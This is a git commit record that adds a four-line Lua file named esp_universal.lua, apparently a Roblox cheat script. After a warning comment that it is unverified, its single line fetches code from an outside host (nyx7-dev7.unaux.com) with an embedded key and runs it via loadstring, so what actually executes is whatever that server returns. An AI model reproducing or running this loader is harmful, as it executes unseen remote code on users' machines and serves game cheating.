1807c645169cb396dae9b0d198b6937a2c0cb502
Mizumaru † <akioishikawa4@gmail.com>
2026-04-23 16:38:59 +0800

    All Belong To @mizcanscripts

---
+++ api/scripts/fetch/esp_universal.lua
@@ -0,0 +1,4 @@
+--[[
+	WARNING: Heads up! This script has not been verified by MZX. Use at your own risk!
+]]
+loadstring(game:HttpGet('https://nyx7-dev7.unaux.com/api.php?key=SV_19F1C6CC515797E1'))()
